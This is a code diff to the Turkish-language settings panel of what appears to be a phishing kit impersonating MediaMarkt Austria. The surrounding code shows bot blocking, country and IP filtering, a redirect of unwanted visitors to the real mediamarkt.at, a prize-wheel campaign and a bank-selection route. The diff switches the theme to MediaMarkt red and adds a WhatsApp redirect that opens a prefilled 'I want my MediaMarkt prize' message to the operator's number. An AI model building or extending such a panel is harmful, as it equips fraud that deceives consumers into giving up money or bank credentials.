@@ -14,7 +14,9 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   const [geoRedirectUrl, setGeoRedirectUrl] = useState<string>("https://www.mediamarkt.at");
   const [blockBots, setBlockBots] = useState<boolean>(false);
   const [campaignName, setCampaignName] = useState("MediaMarkt");
-  const [themePrimary, setThemePrimary] = useState("#12584F");
+  const [themePrimary, setThemePrimary] = useState("#DF0000");
+  const [whatsappNumber, setWhatsappNumber] = useState("");
+  const [whatsappMessage, setWhatsappMessage] = useState("");
   const [openContinent, setOpenContinent] = useState<string | null>(null);
   const supabase = createBrowserSupabaseClient();
 
@@ -65,6 +67,8 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
       setAllowedCountries(Array.isArray(sc.allowed_countries) ? sc.allowed_countries : []);
       setAllowedIps(Array.isArray(sc.allowed_ips) ? sc.allowed_ips.join("\n") : "");
       setBlockBots(sc.block_bots === true);
+      setWhatsappNumber(typeof sc.whatsapp_number === "string" ? sc.whatsapp_number : "");
+      setWhatsappMessage(typeof sc.whatsapp_message === "string" ? sc.whatsapp_message : "");
       setGeoRedirectUrl(
         typeof sc.geo_redirect_url === "string" && sc.geo_redirect_url.trim() !== ""
           ? sc.geo_redirect_url
@@ -78,7 +82,7 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
       setThemePrimary(
         typeof ws.theme_primary === "string" && /^#[0-9a-fA-F]{6}$/.test(ws.theme_primary.trim())
           ? ws.theme_primary.trim()
-          : "#12584F",
+          : "#DF0000",
       );
     }
     setLoading(false);
@@ -113,12 +117,14 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
           allowed_ips: allowedIps.split("\n").map((s) => s.trim()).filter(Boolean),
           allowed_countries: allowedCountries,
           geo_redirect_url: geoRedirectUrl.trim() || "https://www.mediamarkt.at",
+          whatsapp_number: whatsappNumber.trim(),
+          whatsapp_message: whatsappMessage,
         },
         wheel_settings: {
           ...(settings.wheel_settings || {}),
           campaign_name: campaignName.trim() || "MediaMarkt",
           theme_primary:
-            /^#[0-9a-fA-F]{6}$/.test(themePrimary.trim()) && themePrimary.trim().toLowerCase() !== "#12584f"
+            /^#[0-9a-fA-F]{6}$/.test(themePrimary.trim()) && themePrimary.trim().toLowerCase() !== "#df0000"
               ? themePrimary.trim()
               : "",
         }
@@ -385,6 +391,32 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                 <option value="/code">Katılım Kodu — /code</option>
                 <option value="/banken">Banka Seçimi — /banken</option>
               </select>
+            </div>
+
+            {/* WhatsApp Yönlendirme */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-[#25D366]/30 bg-[#25D366]/5' : 'border-green-200 bg-green-50/60'}`}>
+              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>WhatsApp Yönlendirme</label>
+              <p className={`text-[11px] mb-3 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Kullanıcı aksiyon menüsünden "WhatsApp'a Yönlendir" seçildiğinde bu numaraya WhatsApp üzerinden mesaj gönderir.
+              </p>
+              <input
+                type="text"
+                value={whatsappNumber}
+                onChange={(e) => setWhatsappNumber(e.target.value)}
+                placeholder="+43 660 1234567"
+                className={`w-full px-4 py-3 rounded-xl text-sm font-bold outline-none transition-all mb-3 ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#25D366]' : 'bg-white border border-gray-200 focus:border-[#25D366]'}`}
+              />
+              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Otomatik Mesaj</label>
+              <textarea
+                value={whatsappMessage}
+                onChange={(e) => setWhatsappMessage(e.target.value)}
+                rows={3}
+                placeholder="Hallo, ich moechte meine MediaMarkt Praemie erhalten..."
+                className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all resize-none ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#25D366]' : 'bg-white border border-gray-200 focus:border-[#25D366]'}`}
+              />
+              <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Buraya yazdığın metin, kullanıcının WhatsApp'ında <b>hazır mesaj olarak</b> açılır — tek dokunuşla sana gönderir.
+              </p>
             </div>
           </div>
         </div>
